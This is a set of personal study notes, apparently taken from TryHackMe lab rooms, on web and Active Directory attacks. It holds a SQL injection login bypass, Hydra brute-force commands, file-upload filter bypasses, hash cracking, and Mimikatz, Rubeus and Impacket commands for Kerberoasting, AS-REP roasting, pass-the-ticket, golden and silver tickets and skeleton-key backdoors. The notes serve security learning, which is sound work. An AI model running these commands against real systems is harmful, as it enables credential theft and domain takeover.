1. SQLi
  {"email":"' or 1=1--","password":"no"}
  Why does this work?

      1.The character ' will close the brackets in the SQL query
      2.'OR' in a SQL statement will return true if either side of it is true. As 1=1 is always true, the whole statement is true. Thus it will tell the server that the email is valid, and log us into user id 0, which happens to be the administrator account. The 1=1 can be used when the email or username is not known or invalid
      3.The -- character is used in SQL to comment out data, any restrictions on the login will no longer work as they are interpreted as a comment. This is like the # and // comment in python and javascript respectively

  {"email":"bender@juice-sh.op'--","password":"a"}

2. Broken Authentication
The § § is not two sperate inputs but rather Burp's implementation of quotations e.g. ""
hydra
  hydra -t 4 -l admin@juice-sh.op -P /usr/share/seclists/Passwords/Common-Credentials/best1050.txt 10.10.223.38 http-post-form "/#/login:password=^PASS^=yes&login=Log+In&proc_login=true:Invalid email or password."

#Another use of hydra
hydra -L users.txt -P /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt -f 10.10.82.175 -s 8080 http-get /manager/html #Not worked
hydra -l jan -t 4 -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt ssh://10.10.55.243

Consider the following concrete examples:

    hydra -l mark -P /usr/share/wordlists/rockyou.txt 10.10.186.248 ftp will use mark as the username as it iterates over the provided passwords against the FTP server.
    hydra -l mark -P /usr/share/wordlists/rockyou.txt ftp://10.10.186.248 is identical to the previous example. 10.10.186.248 ftp is the same as ftp://10.10.186.248.
    hydra -l frank -P /usr/share/wordlists/rockyou.txt 10.10.186.248 ssh will use frank as the user name as it tries to login via SSH using the different passwords.
    hydra -l <username> -P <wordlist> 10.10.22.33 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
    hydra -t 4 -I -l molly -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt 10.10.22.33 http-post-form "/login/:username=molly&password=^PASS^:Your username or password is incorrect."
    hydra -L usernames -P passwords 192.208.137.3 http-post-form
"/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:Invalid
credentials or user not activated!"

There are some extra optional arguments that you can add:

    -s PORT to specify a non-default port for the service in question.
    -V or -vV, for verbose, makes Hydra show the username and password combinations that are being tried. This verbosity is very convenient to see the progress, especially if you are still not confident of your command-line syntax.
    -t n where n is the number of parallel connections to the target. -t 16 will create 16 threads used to connect to the target.
    -d, for debugging, to get more detailed information about what’s going on. The debugging output can save you much frustration; for instance, if Hydra tries to connect to a closed port and timing out, -d will reveal this right away.

Filtering
  Extension validation
    MS Windows still uses them to identify file types
    Unix use magic numbers
  File type filtering
    MIME validation
      (Multipurpose Internet Mail Extension) types are used as an identifier for files -- originally when transfered as attachments over email, but now also when files are being transferred over HTTP(S). The MIME type for a file upload is attached in the header of the request with the format <type>/<subtype>
        Content-Type: image/jpeg
    Magic number validation
  FIle length
  file name     
    "bad characters"
  file content

  Bypassing client-side filtering
    Turn off Javascript in your browser -- this will work provided the site doesn't require Javascript in order to provide basic functionality. If turning off Javascript completely will prevent the site from working at all then one of the other methods would be more desirable; otherwise, this can be an effective way of completely bypassing the client-side filter.
    
    Intercept and modify the incoming page. Using Burpsuite, we can intercept the incoming web page and strip out the Javascript filter before it has a chance to run. The process for this will be covered below. It's worth noting here that Burpsuite will not, by default, intercept any external Javascript files that the web page is loading. If you need to edit a script which is not inside the main page being loaded, you'll need to go to the "Options" tab at the top of the Burpsuite window, then under the "Intercept Client Requests" section, edit the condition of the first line to remove ^js$|:
      Example: Refresh page and do intercept > response to this request with burp. Eliminate or comment unwanted function. Forward.

    Intercept and modify the file upload. Where the previous method works before the webpage is loaded, this method allows the web page to load as normal, but intercepts the file upload after it's already passed (and been accepted by the filter). Again, we will cover the process for using this method in the course of the task.
        Example with a legitimate extension: Intercept when uploading the message and changing extension and MIME

    Send the file directly to the upload point. Why use the webpage with the filter, when you can send the file directly using a tool like curl? Posting the data directly to the page which contains the code for handling the file upload is another effective method for completely bypassing a client side filter. We will not be covering this method in any real depth in this tutorial, however, the syntax for such a command would look something like this: curl -X POST -F "submit:<value>" -F "<file-parameter>:@<path-to-file>" <site>. To use this method you would first aim to intercept a successful upload (using Burpsuite or the browser console) to see the parameters being used in the upload, which can then be slotted into the above command

  BYpassing server-side filtering: 
    File extensions
      Another example would be testing which is a valid extension and upload other file with 2 extensions. Valid: dog.jpg | Not valid malicious.php | Valid to access: malicious.jpg.php or malicious.jpg.php5

    Magic numbers
      Using hexeditor to check first 8 hex characters and file 
      We could use vim with :%!xxd. To save changes :%!xxd -r
====================
Hashing 

    You can't encrypt the passwords, as the key has to be stored somewhere. If someone gets the key, they can just decrypt the passwords.

    This is where hashing comes in. What if, instead of storing the password, you just stored the hash of the password? This means you never have to store the user's password, and if your database was leaked then an attacker would have to crack each password to find out what the password was. That sounds fairly useful.

    There's just one problem with this. What if two users have the same password? As a hash function will always turn the same input into the same output, you will store the same password hash for each user. That means if someone cracks that hash, they get into more than one account. It also means that someone can create a "Rainbow table" to break the hashes.

    A rainbow table is a lookup table of hashes to plaintexts, so you can quickly find out what password a user had just from the hash. A rainbow table trades time taken to crack a hash for hard disk space, but they do take time to create.


    To protect against rainbow tables, we add a salt to the passwords. The salt is randomly generated and stored in the database, unique to each user. In theory, you could use the same salt for all users but that means that duplicate passwords would still have the same hash, and a rainbow table could still be created specific passwords with that salt.

    The salt is added to either the start or the end of the password before it’s hashed, and this means that every user will have a different password hash even if they have the same password. Hash functions like bcrypt and sha512crypt handle this automatically. Salts don’t need to be kept private.



    Unix style password hashes are very easy to recognise, as they have a prefix. The prefix tells you the hashing algorithm used to generate the hash. The standard format is$format$rounds$salt$hash.

    Windows passwords are hashed using NTLM, which is a variant of md4. They're visually identical to md4 and md5 hashes, so it's very important to use context to work out the hash type.

    On Linux, password hashes are stored in /etc/shadow. This file is normally only readable by root. They used to be stored in /etc/passwd, and were readable by everyone.

    On Windows, password hashes are stored in the SAM. Windows tries to prevent normal users from dumping them, but tools like mimikatz exist for this. Importantly, the hashes found there are split into NT hashes and LM hashes.


============================
John the ripper

john --format=[format] --wordlist=[path]

  A Note on Formats:
    When you are telling john to use formats, if you're dealing with a standard hash type, e.g. md5 as in the example above, you have to prefix it with raw- to tell john you're just dealing with a standard hash type, though this doesn't always apply. To check if you need to add the prefix or not, you can list all of John's formats using john --list=formats and either check manually, or grep for your hash type using something like john --list=formats | grep -iF "md5".

NTHash / NTLM

  NThash is the hash format that modern Windows Operating System machines will store user and service passwords in. It's also commonly referred to as "NTLM" which references the previous version of Windows format for hashing passwords known as "LM", thus "NT/LM".

  A little bit of history, the NT designation for Windows products originally meant "New Technology", and was used- starting with Windows NT, to denote products that were not built up from the MS-DOS Operating System. Eventually, the "NT" line became the standard Operating System type to be released by Microsoft and the name was dropped, but it still lives on in the names of some Microsoft technologies. 

  You can acquire NTHash/NTLM hashes by dumping the SAM database on a Windows machine, by using a tool like Mimikatz or from the Active Directory database: NTDS.dit. You may not have to crack the hash to continue privilege escalation- as you can often conduct a "pass the hash" attack instead, but sometimes hash cracking is a viable option if there is a weak password policy

Unshadowing
  unshadow [path to passwd] [path to shadow]
  unshadow - Invokes the unshadow tool
  [path to passwd] - The file that contains the copy of the /etc/passwd file you've taken from the target machine
  [path to shadow] - The file that contains the copy of the /etc/shadow file you've taken from the target machine 

Using single crack mode
  john --single --format=[format] [path to file]

  A Note on File Formats in Single Crack Mode:
    If you're cracking hashes in single crack mode, you need to change the file format that you're feeding john for it to understand what data to create a wordlist from. You do this by prepending the hash with the username that the hash belongs to, so according to the above example- we would change the file hashes.txt
    From:
    1efee03cdcb96d90ad48ccc7b8666033
    To
    mike:1efee03cdcb96d90ad48ccc7b8666033


How to create Custom Rules

  Custom rules are defined in the john.conf file, usually located in /etc/john/john.conf if you have installed John using a package manager or built from source with make and in /opt/john/john.conf on the TryHackMe Attackbox.

  Let's go over the syntax of these custom rules, using the example above as our target pattern. Note that there is a massive level of granular control that you can define in these rules, I would suggest taking a look at the wiki here in order to get a full view of the types of modifier you can use, as well as more examples of rule implementation.

  The first line:
  [List.Rules:THMRules] - Is used to define the name of your rule, this is what you will use to call your custom rule as a John argument.
  We then use a regex style pattern match to define where in the word will be modified, again- we will only cover the basic and most common modifiers here:
  Az - Takes the word and appends it with the characters you define
  A0 - Takes the word and prepends it with the characters you define
  c - Capitalises the character positionally

  These can be used in combination to define where and what in the word you want to modify.

  Lastly, we then need to define what characters should be appended, prepended or otherwise included, we do this by adding character sets in square brackets [ ] in the order they should be used. These directly follow the modifier patterns inside of double quotes " ". Here are some common examples:

  https://campus.barracuda.com/product/campus/doc/5472273/regular-expressions
  [0-9] - Will include numbers 0-9
  [0] - Will include only the number 0
  [A-z] - Will include both upper and lowercase
  [A-Z] - Will include only uppercase letters
  [a-z] - Will include only lowercase letters
  [a] - Will include only a
  [!£$%@] - Will include the symbols !£$%@


  Putting this all together, in order to generate a wordlist from the rules that would match the example password "Polopassword1!" (assuming the word polopassword was in our wordlist) we would create a rule entry that looks like this:
  [List.Rules:PoloPassword]
  cAz"[0-9] [!£$%@]"

  In order to:
    Capitalise the first  letter - c
    Append to the end of the word - Az
    A number in the range 0-9 - [0-9]
    Followed by a symbol that is one of [!£$%@]
  
  Using Custom Rules
  We could then call this custom rule as a John argument using the  --rule=PoloPassword flag.
  As a full command: john --wordlist=[path to wordlist] --rule=PoloPassword [path to file]
  As a note I find it helpful to talk out the patterns if you're writing a rule- as shown above, the same applies to writing RegEx patterns too.

  Jumbo John already comes with a large list of custom rules, which contain modifiers for use almost all cases. If you get stuck, try looking at those rules [around line 678] if your syntax isn't working properly.

Cracking password protected zip file
Zip2John

  Similarly to the unshadow tool that we used previously, we're going to be using the zip2john tool to convert the zip file into a hash format that John is able to understand, and hopefully crack. The basic usage is like this:
  zip2john [options] [zip file] > [output file]
  [options] - Allows you to pass specific checksum options to zip2john, this shouldn't often be necessary
  [zip file] - The path to the zip file you wish to get the hash of
  > - This is the output director, we're using this to send the output from this file to the...
  [output file] - This is the file that will store the output from

  Example Usage
    zip2john zipfile.zip > zip_hash.txt

Cracking a password protected RAR archive
Rar2John

  Almost identical to the zip2john tool that we just used, we're going to use the rar2john tool to convert the rar file into a hash format that John is able to understand. The basic syntax is as follows:
  rar2john [rar file] > [output file]
  rar2john - Invokes the rar2john tool
  [rar file] - The path to the rar file you wish to get the hash of
  > - This is the output director, we're using this to send the output from this file to the...
  [output file] - This is the file that will store the output from

  Example Usage
    rar2john rarfile.rar > rar_hash.txt

Cracking SSH key passwords

  Note that if you don't have ssh2john installed, you can use ssh2john.py, which is located in the /opt/john/ssh2john.py. If you're doing this, replace the ssh2john command with python3 /opt/ssh2john.py or on Kali, python /usr/share/john/ssh2john.py.

  ssh2john [id_rsa private key file] > [output file]

  ssh2john - Invokes the ssh2john tool

  [id_rsa private key file] - The path to the id_rsa file you wish to get the hash of

  > - This is the output director, we're using this to send the output from this file to the...
  [output file] - This is the file that will store the output from 

=====================================================
Encryption - Crypto 101

  Passphrase - Separate to the key, a passphrase is similar to a password and used to protect a key.

DO NOT encrypt passwords unless you’re doing something like a password manager. Passwords should not be stored in plaintext, and you should use hashing to manage them safely.
An important thing to remember about modulo is that it’s not reversible. If I gave you an equation: x % 5 = 4, there are infinite values of x that will be valid.

The two main categories of Encryption are symmetric and asymmetric.

  Symmetric encryption uses the same key to encrypt and decrypt the data. Examples of Symmetric encryption are DES (Broken) and AES. These algorithms tend to be faster than asymmetric cryptography, and use smaller keys (128 or 256 bit keys are common for AES, DES keys are 56 bits long).

  Asymmetric encryption uses a pair of keys, one to encrypt and the other in the pair to decrypt. Examples are RSA and Elliptic Curve Cryptography. Normally these keys are referred to as a public key and a private key. Data encrypted with the private key can be decrypted with the public key, and vice versa. Your private key needs to be kept private, hence the name. Asymmetric encryption tends to be slower and uses larger keys, for example RSA typically uses 2048 to 4096 bit keys.

=-=-=-=-=
The math(s) side

  RSA is based on the mathematically difficult problem of working out the factors of a large number. It’s very quick to multiply two prime numbers together, say 17*23 = 391, but it’s quite difficult to work out what two prime numbers multiply together to make 14351 (113x127 for reference).
  The attacking side

  The maths behind RSA seems to come up relatively often in CTFs, normally requiring you to calculate variables or break some encryption based on them. The wikipedia page for RSA seems complicated at first, but will give you almost all of the information you need in order to complete challenges.

  There are some excellent tools for defeating RSA challenges in CTFs, and my personal favorite is https://github.com/Ganapati/RsaCtfTool which has worked very well for me. I’ve also had some success with https://github.com/ius/rsatool.

  The key variables that you need to know about for RSA in CTFs are p, q, m, n, e, d, and c.

  “p” and “q” are large prime numbers, “n” is the product of p and q.

  The public key is n and e, the private key is n and d.

  “m” is used to represent the message (in plaintext) and “c” represents the ciphertext (encrypted text).

SSH authentication
ssh-keygen
  It’s very important to mention that the passphrase to decrypt the key isn’t used to identify you to the server at all, all it does is decrypt the SSH key. The passphrase is never transmitted, and never leaves your system.

=======================================
Basics of AD 

The Active Directory Data Store holds the databases and processes needed to store and manage directory information such as users, groups, and services. Below is an outline of some of the contents and characteristics of the AD DS Data Store:

    Contains the NTDS.dit - a database that contains all of the information of an Active Directory domain controller as well as password hashes for domain users
    Stored by default in %SystemRoot%\NTDS
    accessible only by the domain controller

A forest consists of these parts:
  Trees - A hierarchy of domains in Active Directory Domain Services
  Domains - Used to group and manage objects 
  Organizational Units (OUs) - Containers for groups, computers, users, printers and other OUs
  Trusts - Allows users to access resources in other domains
  Objects - users, groups, printers, computers, shares
  Domain Services - DNS Server, LLMNR, IPv6
  Domain Schema - Rules for object creation

The four types of users are: 
  Domain Admins - This is the big boss: they control the domains and are the only ones with access to the domain controller.
  Service Accounts (Can be Domain Admins) - These are for the most part never used except for service maintenance, they are required by Windows for services such as SQL to pair a service with a service account
  Local Administrators - These users can make changes to local machines as an administrator and may even be able to control other normal users, but they cannot access the domain controller
  Domain Users - These are your everyday users. They can log in on the machines they have the authorization to access and may have local administrator rights to machines depending on the organization

Active Directory groups: 

    Security Groups - These groups are used to specify permissions for a large number of users
    Distribution Groups - These groups are used to specify email distribution lists. As an attacker these groups are less beneficial to us but can still be beneficial in enumeration

Default Security Groups - 

  There are a lot of default security groups so I won't be going into too much detail of each past a brief description of the permissions that they offer to the assigned group. Here is a brief outline of the security groups:

    Domain Controllers - All domain controllers in the domain
    Domain Guests - All domain guests
    Domain Users - All domain users
    Domain Computers - All workstations and servers joined to the domain
    Domain Admins - Designated administrators of the domain
    Enterprise Admins - Designated administrators of the enterprise
    Schema Admins - Designated administrators of the schema
    DNS Admins - DNS Administrators Group
    DNS Update Proxy - DNS clients who are permitted to perform dynamic updates on behalf of some other clients (such as DHCP servers).
    Allowed RODC Password Replication Group - Members in this group can have their passwords replicated to all read-only domain controllers in the domain
    Group Policy Creator Owners - Members in this group can modify group policy for the domain
    Denied RODC Password Replication Group - Members in this group cannot have their passwords replicated to any read-only domain controllers in the domain
    Protected Users - Members of this group are afforded additional protections against authentication security threats. See http://go.microsoft.com/fwlink/?LinkId=298939 for more information.
    Cert Publishers - Members of this group are permitted to publish certificates to the directory
    Read-Only Domain Controllers - Members of this group are Read-Only Domain Controllers in the domain

Trusts & policies
In some environments trusts can be extended out to external domains and even forests in some cases.

The two types of trusts below: 

    Directional - The direction of the trust flows from a trusting domain to a trusted domain
    Transitive - The trust relationship expands beyond just two domains to include other trusted domains

Domain Policies Overview - 

  Policies are a very big part of Active Directory, they dictate how the server operates and what rules it will and will not follow. You can think of domain policies like domain groups, except instead of permissions they contain rules, and instead of only applying to a group of users, the policies apply to a domain as a whole. They simply act as a rulebook for Active  Directory that a domain admin can modify and alter as they deem necessary to keep the network running smoothly and securely. Along with the very long list of default domain policies, domain admins can choose to add in their own policies not already on the domain controller, for example: if you wanted to disable windows defender across all machines on the domain you could create a new group policy object to disable Windows Defender

Outlined below are the default domain services: 

    LDAP - Lightweight Directory Access Protocol; provides communication between applications and directory services
    Certificate Services - allows the domain controller to create, validate, and revoke public key certificates
    DNS, LLMNR, NBT-NS - Domain Name Services for identifying IP hostnames

Domain authentication overview
    Kerberos - The default authentication service for Active Directory uses ticket-granting tickets and service tickets to authenticate users and give users access to other resources across the domain.
    NTLM - default Windows authentication protocol uses an encrypted challenge/response protocol

Tools needed

With Kerberos we can use Kerbrute
kerbrute userenum -d spookysec.local --dc 10.10.246.78 userlist.txt

After the enumeration of user accounts is finished, we can attempt to abuse a feature within Kerberos with an attack method called ASREPRoasting. ASReproasting occurs when a user account has the privilege "Does not require Pre-Authentication" set. This means that the account does not need to provide valid identification before requesting a Kerberos Ticket on the specified user account.

Impacket has a tool called "GetNPUsers.py" (located in impacket/examples/GetNPUsers.py) that will allow us to query ASReproastable accounts from the Key Distribution Center. The only thing that's necessary to query accounts is a valid set of usernames which we enumerated previously via Kerbrute.

GetNPUsers.py spookysec.local/ -usersfile after_kerbrute.txt -format john -output results.txt

smbclient -U "svc-admin" \\\\10.10.134.44\\backup

Well, it is the backup account for the Domain Controller. This account has a unique permission that allows all Active Directory changes to be synced with this user account. This includes password hashes. Knowing this, we can use another tool within Impacket called "secretsdump.py". This will allow us to retrieve all of the password hashes that this user account (that is synced with the domain controller) has to offer. Exploiting this, we will effectively have full control over the AD Domain.

What is Kerberos?
Kerberos is the default authentication service for Microsoft Windows domains. It is intended to be more "secure" than NTLM by using third party ticket authorization as well as stronger encryption. Even though NTLM has a lot more attack vectors to choose from Kerberos still has a handful of underlying vulnerabilities just like NTLM that we can use to our advantage.


Ticket Granting Ticket (TGT) - A ticket-granting ticket is an authentication ticket used to request service tickets from the TGS for specific resources from the domain.
Key Distribution Center (KDC) - The Key Distribution Center is a service for issuing TGTs and service tickets that consist of the Authentication Service and the Ticket Granting Service.
Authentication Service (AS) - The Authentication Service issues TGTs to be used by the TGS in the domain to request access to other machines and service tickets.

Ticket Granting Service (TGS) - The Ticket Granting Service takes the TGT and returns a ticket to a machine on the domain.
Service Principal Name (SPN) - A Service Principal Name is an identifier given to a service instance to associate a service instance with a domain service account. Windows requires that services have a domain service account which is why a service needs an SPN set.
KDC Long Term Secret Key (KDC LT Key) - The KDC key is based on the KRBTGT service account. It is used to encrypt the TGT and sign the PAC.

Client Long Term Secret Key (Client LT Key) - The client key is based on the computer or service account. It is used to check the encrypted timestamp and encrypt the session key.
Service Long Term Secret Key (Service LT Key) - The service key is based on the service account. It is used to encrypt the service portion of the service ticket and sign the PAC.
Session Key - Issued by the KDC when a TGT is issued. The user will provide the session key to the KDC along with the TGT when requesting a service ticket.
Privilege Attribute Certificate (PAC) - The PAC holds all of the user's relevant information, it is sent along with the TGT to the KDC to be signed by the Target LT Key and the KDC LT Key in order to validate the user.

AS-REQ w/ Pre-Authentication In Detail - 
The AS-REQ step in Kerberos authentication starts when a user requests a TGT from the KDC. In order to validate the user and create a TGT for the user, the KDC must follow these exact steps. The first step is for the user to encrypt a timestamp NT hash and send it to the AS. The KDC attempts to decrypt the timestamp using the NT hash from the user, if successful the KDC will issue a TGT as well as a session key for the user.

Ticket Granting Ticket Contents -
In order to understand how the service tickets get created and validated, we need to start with where the tickets come from; the TGT is provided by the user to the KDC, in return, the KDC validates the TGT and returns a service ticket.

Service Ticket Contents - 
To understand how Kerberos authentication works you first need to understand what these tickets contain and how they're validated. A service ticket contains two portions: the service provided portion and the user-provided portion. I'll break it down into what each portion contains.

    Service Portion: User Details, Session Key, Encrypts the ticket with the service account NTLM hash.
    User Portion: Validity Timestamp, Session Key, Encrypts with the TGT session key.

Kerberos Authentication Overview -

AS-REQ - 1.) The client requests an Authentication Ticket or Ticket Granting Ticket (TGT).

AS-REP - 2.) The Key Distribution Center verifies the client and sends back an encrypted TGT.

TGS-REQ - 3.) The client sends the encrypted TGT to the Ticket Granting Server (TGS) with the Service Principal Name (SPN) of the service the client wants to access.

TGS-REP - 4.) The Key Distribution Center (KDC) verifies the TGT of the user and that the user has access to the service, then sends a valid session key for the service to the client.

AP-REQ - 5.) The client requests the service and sends the valid session key to prove the user has access.

AP-REP - 6.) The service grants access 

Kerberos Tickets Overview - 

The main ticket that you will see is a ticket-granting ticket these can come in various forms such as a .kirbi for Rubeus .ccache for Impacket. The main ticket that you will see is a .kirbi ticket. A ticket is typically base64 encoded and can be used for various attacks. The ticket-granting ticket is only used with the KDC in order to get service tickets. Once you give the TGT the server then gets the User details, session key, and then encrypts the ticket with the service account NTLM hash. Your TGT then gives the encrypted timestamp, session key, and the encrypted TGT. The KDC will then authenticate the TGT and give back a service ticket for the requested service. A normal TGT will only work with that given service account that is connected to it however a KRBTGT allows you to get any service ticket that you want allowing you to access anything on the domain that you want.

Attack Privilege Requirements -

    Kerbrute Enumeration - No domain access required 
    Pass the Ticket - Access as a user to the domain required
    Kerberoasting - Access as any user required
    AS-REP Roasting - Access as any user required
    Golden Ticket - Full domain compromise (domain admin) required 
    Silver Ticket - Service hash required 
    Skeleton Key - Full domain compromise (domain admin) required

Enumeration w/Kerbrute
You need to add the DNS domain name along with the machine IP to /etc/hosts inside of your attacker machine or these attacks will not work for you - 10.10.55.165  CONTROLLER.local    

Abusing Pre-Authentication Overview -

By brute-forcing Kerberos pre-authentication, you do not trigger the account failed to log on event which can throw up red flags to blue teams. When brute-forcing through Kerberos you can brute-force by only sending a single UDP frame to the KDC allowing you to enumerate the users on the domain from a wordlist.

Harvesting & Brute-Forcing tickets w/Rubeus

Rubeus.exe harvest /interval:30 This command tells Rubeus to harvest for TGTs every 30 seconds

Brute-Forcing / Password-Spraying w/ Rubeus -

Rubeus can both brute force passwords as well as password spray user accounts. When brute-forcing passwords you use a single user account and a wordlist of passwords to see which password works for that given user account. In password spraying, you give a single password such as Password1 and "spray" against all found user accounts in the domain to find which one may have that password.

This attack will take a given Kerberos-based password and spray it against all found users and give a .kirbi ticket. This ticket is a TGT that can be used in order to get service tickets from the KDC as well as to be used in attacks like the pass the ticket attack.

Before password spraying with Rubeus, you need to add the domain controller domain name to the windows host file. You can add the IP and domain name to the hosts file from the machine by using the echo command: 

echo 10.10.55.165 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
Rubeus.exe brute /password:Password1 /noticket - This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user

-=-=-=-=
Kerberoasting w/Rubeus & Impacket
Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password. If the service has a registered SPN then it can be Kerberoastable however the success of the attack depends on how strong the password is and if it is trackable as well as the privileges of the cracked service account. To enumerate Kerberoastable accounts I would suggest a tool like BloodHound to find all Kerberoastable accounts, it will allow you to see what kind of accounts you can kerberoast if they are domain admins, and what kind of connections they have to the rest of the domain

Method 1 - Rubeus
Rubeus.exe kerberoast This will dump the Kerberos hash of any kerberoastable users
hashcat -m 13100 -a 0 hash.txt Pass.txt - now crack that hash

Method 2 - Impacket
sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.55.165 -request - this will dump the Kerberos hash for all kerberoastable accounts it can find on the target domain just like Rubeus does; however, this does not have to be on the targets machine and can be done remotely.
hashcat -m 13100 -a 0 hash.txt Pass.txt - now crack that hash

Kerberoasting Mitigation
Don't Make Service Accounts Domain Admins - Service accounts don't need to be domain admins, kerberoasting won't be as effective if you don't make service accounts domain admins.

-=-=-=-==
AS-REP Roasting w/Rubeus 
Very similar to Kerberoasting, AS-REP Roasting dumps the krbasrep5 hashes of user accounts that have Kerberos pre-authentication disabled. Unlike Kerberoasting these users do not have to be service accounts the only requirement to be able to AS-REP roast a user is the user must have pre-authentication disabled.

We'll continue using Rubeus same as we have with kerberoasting and harvesting since Rubeus has a very simple and easy to understand command to AS-REP roast and attack users with Kerberos pre-authentication disabled. After dumping the hash from Rubeus we'll use hashcat in order to crack the krbasrep5 hash.

There are other tools out as well for AS-REP Roasting such as kekeo and Impacket's GetNPUsers.py. Rubeus is easier to use because it automatically finds AS-REP Roastable users whereas with GetNPUsers you have to enumerate the users beforehand and know which users may be AS-REP Roastable.


AS-REP Roasting Overview - 

During pre-authentication, the users hash will be used to encrypt a timestamp that the domain controller will attempt to decrypt to validate that the right hash is being used and is not replaying a previous request. After validating the timestamp the KDC will then issue a TGT for the user. If pre-authentication is disabled you can request any authentication data for any user and the KDC will return an encrypted TGT that can be cracked offline because the KDC skips the step of validating that the user is really who they say that they are.

Dumping KRBASREP5 Hashes w/ Rubeus -
  Rubeus.exe asreproast - This will run the AS-REP roast command looking for vulnerable users and then dump found vulnerable user hashes.
Crack those Hashes w/ hashcat - 
  Insert 23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User.....

AS-REP Roasting Mitigations - 

    Have a strong password policy. With a strong password, the hashes will take longer to crack making this attack less effective

    Don't turn off Kerberos Pre-Authentication unless it's necessary there's almost no other way to completely mitigate this attack other than keeping Pre-Authentication on.

Pass the ticket w/ mimikatz 
Mimikatz is a very popular and powerful post-exploitation tool most commonly used for dumping user credentials inside of an active directory network however well be using mimikatz in order to dump a TGT from LSASS memory

Pass the Ticket Overview - 
Pass the ticket works by dumping the TGT from the LSASS memory of the machine. The Local Security Authority Subsystem Service (LSASS) is a memory process that stores credentials on an active directory server and can store Kerberos ticket along with other credential types to act as the gatekeeper and accept or reject the credentials provided. You can dump the Kerberos Tickets from the LSASS memory just like you can dump hashes. When you dump the tickets with mimikatz it will give us a .kirbi ticket which can be used to gain domain admin if a domain admin ticket is in the LSASS memory. This attack is great for privilege escalation and lateral movement if there are unsecured domain service account tickets laying around. The attack allows you to escalate to domain admin if you dump a domain admin's ticket and then impersonate that ticket using mimikatz PTT attack allowing you to act as that domain admin. You can think of a pass the ticket attack like reusing an existing ticket were not creating or destroying any tickets here were simply reusing an existing ticket from another user on the domain and impersonating that ticket.

First, we utilize UACME to bypass UAC protection and get “Debug Privileges” and “High Integrity”. We can use “whoami /all” to check current privileges and the integrity level

mimikatz.exe
privilege::debug - Ensure this outputs [output '20' OK] if it does not that means you do not have the administrator privileges to properly run mimikatz
sekurlsa::tickets /export - this will export all of the .kirbi tickets into the directory that you are currently in

1.) kerberos::ptt <ticket> - run this command inside of mimikatz with the ticket that you harvested from earlier. It will cache and impersonate the given ticket

2.) klist - Here were just verifying that we successfully impersonated the ticket by listing our cached tickets.


Pass the Ticket Mitigation -

Let's talk blue team and how to mitigate these types of attacks. 

    Don't let your domain admins log onto anything except the domain controller - This is something so simple however a lot of domain admins still log onto low-level computers leaving tickets around that we can use to attack and move laterally with.
-=-=-=-=-=-=
Golden/Silver Ticket Attacks w/ mimikatz 

Mimikatz is a very popular and powerful post-exploitation tool most commonly used for dumping user credentials inside of an active directory network however well be using mimikatz in order to create a silver ticket.

A silver ticket can sometimes be better used in engagements rather than a golden ticket because it is a little more discreet. If stealth and staying undetected matter then a silver ticket is probably a better option than a golden ticket however the approach to creating one is the exact same. The key difference between the two tickets is that a silver ticket is limited to the service that is targeted whereas a golden ticket has access to any Kerberos service.

A specific use scenario for a silver ticket would be that you want to access the domain's SQL server however your current compromised user does not have access to that server. You can find an accessible service account to get a foothold with by kerberoasting that service, you can then dump the service hash and then impersonate their TGT in order to request a service ticket for the SQL service from the KDC allowing you access to the domain's SQL server.

KRBTGT Overview 

In order to fully understand how these attacks work you need to understand what the difference between a KRBTGT and a TGT is. A KRBTGT is the service account for the KDC this is the Key Distribution Center that issues all of the tickets to the clients. If you impersonate this account and create a golden ticket form the KRBTGT you give yourself the ability to create a service ticket for anything you want. A TGT is a ticket to a service account issued by the KDC and can only access that service the TGT is from like the SQLService ticket.

Golden/Silver Ticket Attack Overview - 

A golden ticket attack works by dumping the ticket-granting ticket of any user on the domain this would preferably be a domain admin however for a golden ticket you would dump the krbtgt ticket and for a silver ticket, you would dump any service or domain admin ticket. This will provide you with the service/domain admin account's SID or security identifier that is a unique identifier for each user account, as well as the NTLM hash. You then use these details inside of a mimikatz golden ticket attack in order to create a TGT that impersonates the given service account information.

Dump the krbtgt hash -
  privilege::debug - ensure this outputs [privilege '20' ok]
  lsadump::lsa /inject /name:krbtgt - This will dump the hash as well as the security identifier needed to create a Golden Ticket. To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.


Create a Golden/Silver Ticket - 

Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id: - This is the command for creating a golden ticket to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103.
  Ex: kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:500 

Use the Golden/Silver Ticket to access other machines -

misc::cmd - this will open a new elevated command prompt with the given ticket in mimikatz.

Access machines that you want, what you can access will depend on the privileges of the user that you decided to take the ticket from however if you took the ticket from krbtgt you have access to the ENTIRE network hence the name golden ticket; however, silver tickets only have access to those that the user has access to if it is a domain admin it can almost access the entire network however it is slightly less elevated from a golden ticket.

 -=-=-=-=-=-=
 Kerberos Backdoors w/ mimikatz 

Along with maintaining access using golden and silver tickets mimikatz has one other trick up its sleeves when it comes to attacking Kerberos. Unlike the golden and silver ticket attacks a Kerberos backdoor is much more subtle because it acts similar to a rootkit by implanting itself into the memory of the domain forest allowing itself access to any of the machines with a master password. 

The Kerberos backdoor works by implanting a skeleton key that abuses the way that the AS-REQ validates encrypted timestamps. A skeleton key only works using Kerberos RC4 encryption. 

The default hash for a mimikatz skeleton key is 60BA4FCADC466C7A033C178194C03DF6 which makes the password -"mimikatz"

Skeleton Key Overview -

The skeleton key works by abusing the AS-REQ encrypted timestamps as I said above, the timestamp is encrypted with the users NT hash. The domain controller then tries to decrypt this timestamp with the users NT hash, once a skeleton key is implanted the domain controller tries to decrypt the timestamp using both the user NT hash and the skeleton key NT hash allowing you access to the domain forest.

privilege::debug
misc::skeleton 

Accessing the forest - 

The default credentials will be: "mimikatz"

